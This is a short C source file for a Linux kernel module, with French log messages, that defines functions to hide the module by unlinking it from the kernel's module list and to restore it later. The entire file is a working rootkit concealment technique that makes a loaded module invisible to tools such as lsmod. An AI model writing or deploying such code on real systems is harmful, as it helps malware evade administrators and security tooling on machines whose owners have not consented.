#include <linux/module.h>
#include <linux/list.h>
#include <linux/kernel.h>
#include "hide.h"

static int hidden = 0;
static struct list_head *prev_module;


int set_hide(void){
    if (hidden){
            printk(KERN_INFO "deja caché non?\n");
        return -1;
    }
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
    printk(KERN_INFO "ok le module est caché\n");
    return 0;
}



int unset_hide(void){
  if (!hidden){
        printk(KERN_INFO "il etait meme pas caché\n");
        return -1;
    }
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
    printk(KERN_INFO "module visible maintenant\n");
    return 0;
}



